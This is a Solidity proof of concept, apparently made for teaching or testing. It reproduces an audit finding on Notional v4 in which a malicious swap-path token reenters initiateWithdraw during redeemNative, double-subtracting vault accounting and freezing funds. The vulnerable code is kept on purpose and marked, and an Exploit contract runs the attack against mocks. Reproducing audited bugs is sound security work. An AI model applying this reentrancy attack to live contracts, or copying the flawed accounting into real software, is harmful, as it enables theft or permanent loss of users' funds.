// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Notional v4 — redeemNative reentrancy enables permanent fund freeze
    (MixBytes, finding #63524)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: redeemNative/_burnShares snapshots yield-token balance, then
    performs an external trade. A malicious path token reenters via
    initiateWithdraw, which also transfers yield tokens and decrements
    s_yieldTokenBalance. After return, _burnShares subtracts the full
    pre-reentrancy delta again → double-count → tokens frozen (balance >
    accounting) and share price distortion.
    Blamed double-subtraction path preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external virtual returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @dev Malicious intermediate token that reenters initiateWithdraw on transfer.
contract MaliciousToken is MockERC20 {
    address public lr;
    address public onBehalf;
    address public vault;
    uint256 public count;

    constructor() MockERC20("Malicious", "MAL") {}

    function configure(address lr_, address onBehalf_, address vault_) external {
        lr = lr_;
        onBehalf = onBehalf_;
        vault = vault_;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        if (count == 0 && lr != address(0)) {
            count = 1;
            // Reenter lending router withdraw while vault is mid-redeem
            ILendingRouter(lr).initiateWithdraw(onBehalf, vault, "");
        }
        _xfer(msg.sender, to, value);
        return true;
    }
}

interface ILendingRouter {
    function initiateWithdraw(address onBehalf, address vault, bytes calldata data) external;
}

/// @notice Minimal lending router that pulls yield tokens from vault on withdraw.
contract LendingRouter {
    function initiateWithdraw(address onBehalf, address vault, bytes calldata) external {
        YieldVault(vault).processWithdrawRequest(onBehalf, 5 ether);
    }
}

/// @notice Reduced AbstractYieldStrategy redeem accounting.
/// Source: AbstractYieldStrategy._burnShares / redeemNative (Notional v4 MixBytes).
contract YieldVault {
    MockERC20 public immutable yieldToken;
    MockERC20 public immutable asset;
    uint256 public s_yieldTokenBalance;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    address public lendingRouter;
    address public tradeTarget; // malicious token used as "swap path"
    bool private _inRedeem;

    constructor(MockERC20 yt, MockERC20 a) {
        yieldToken = yt;
        asset = a;
    }

    function setRouter(address r) external {
        lendingRouter = r;
    }

    function setTradeTarget(address t) external {
        tradeTarget = t;
    }

    function seed(address user, uint256 yieldAmt, uint256 shares) external {
        yieldToken.transferFrom(msg.sender, address(this), yieldAmt);
        s_yieldTokenBalance += yieldAmt;
        totalSupply += shares;
        balanceOf[user] += shares;
    }

    /// @dev Called by router during reentrancy — transfers N yield tokens + updates accounting.
    function processWithdrawRequest(address to, uint256 n) external {
        require(msg.sender == lendingRouter, "router");
        yieldToken.transfer(to, n);
        s_yieldTokenBalance -= n; // first subtraction of N
    }

    /// @notice Instant redeem with external trade (reentrancy surface).
    function redeemNative(uint256 shares, address /*receiver*/) external {
        require(balanceOf[msg.sender] >= shares, "shares");
        _burnShares(msg.sender, shares);
    }

    function _burnShares(address owner, uint256 shares) internal {
        uint256 yieldTokensBefore = yieldToken.balanceOf(address(this));

        // External trade during redeem — malicious token reenters here
        _executeTrade(shares);

        uint256 yieldTokensAfter = yieldToken.balanceOf(address(this));
        uint256 yieldTokensRedeemed = yieldTokensBefore - yieldTokensAfter;

        // Double-count path: reentrancy already reduced s_yieldTokenBalance by N,
        // and yieldTokensRedeemed includes both the trade amount M and N.
        s_yieldTokenBalance -= yieldTokensRedeemed; // @> VULN: subtracts full pre-reentrancy delta (M+N) after reentrancy already subtracted N → freezes N yield tokens
        // FIX: nonReentrant on redeemNative / initiateWithdraw; validate swap path

        balanceOf[owner] -= shares;
        totalSupply -= shares;

        // Pay asset out of thin air for demo (focus is yield accounting freeze)
        asset.mint(owner, shares / 1e6 + 1);
    }

    function _executeTrade(uint256 /*shares*/) internal {
        // Simulate Uniswap V2 hop: sell M yield tokens, then path touches malicious token
        // whose transfer reenters initiateWithdraw mid-_burnShares.
        uint256 m = 3 ether;
        yieldToken.transfer(address(0xDEAD), m); // M leaves vault (trade out)
        // Path hop: vault transfers 1 MAL (held from setup) → malicious transfer reenters
        MaliciousToken(tradeTarget).transfer(address(0xBEEF), 1);
    }
}

/// CREATE: yieldToken(1), asset(2), mal(3), router(4), vault(5)
contract Exploit {
    MockERC20 public yieldToken;
    MockERC20 public asset;
    MaliciousToken public mal;
    LendingRouter public router;
    YieldVault public vault;

    uint256 public accountingAfter;
    uint256 public realBalanceAfter;
    uint256 public frozen;

    constructor() {
        yieldToken = new MockERC20("weETH", "weETH");
        asset = new MockERC20("WETH", "WETH");
        mal = new MaliciousToken();
        router = new LendingRouter();
        vault = new YieldVault(yieldToken, asset);
        vault.setRouter(address(router));
        vault.setTradeTarget(address(mal));
        mal.configure(address(router), address(this), address(vault));
        // Vault must hold MAL so the simulated Uniswap hop transfer succeeds
        mal.mint(address(vault), 1000 ether);
    }

    function run() external {
        // Vault holds 20 yield tokens, attacker holds shares
        yieldToken.mint(address(this), 20 ether);
        yieldToken.approve(address(vault), type(uint256).max);
        vault.seed(address(this), 20 ether, 20 ether);

        require(vault.s_yieldTokenBalance() == 20 ether, "acct");
        require(yieldToken.balanceOf(address(vault)) == 20 ether, "bal");

        // Redeem — trade removes 3 ether, reentrancy removes 5 ether, then
        // burn subtracts (3+5)=8 from accounting that already lost 5 → net -13 vs -8 real
        // Real balance after: 20 - 3 - 5 = 12
        // Accounting: 20 - 5 (reenter) - 8 (burn) = 7
        // Frozen: 12 - 7 = 5
        vault.redeemNative(10 ether, address(this));

        accountingAfter = vault.s_yieldTokenBalance();
        realBalanceAfter = yieldToken.balanceOf(address(vault));
        require(realBalanceAfter > accountingAfter, "freeze mismatch");
        frozen = realBalanceAfter - accountingAfter;
        require(frozen == 5 ether, "N=5 frozen");
    }
}
